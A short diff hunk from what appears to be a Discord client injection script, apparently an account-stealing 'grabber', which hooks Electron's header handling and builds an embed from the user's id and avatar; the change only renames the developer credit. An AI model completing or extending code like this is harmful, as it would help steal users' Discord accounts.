@@ -212,7 +212,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         "name": "Intersel - version 1.0"
                     },
                     "footer": {
-                        "text": "Developed by bandit#8773"
+                        "text": "Developed by RyZe vdb#2400"
                     },
                     "thumbnail": {
                         "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
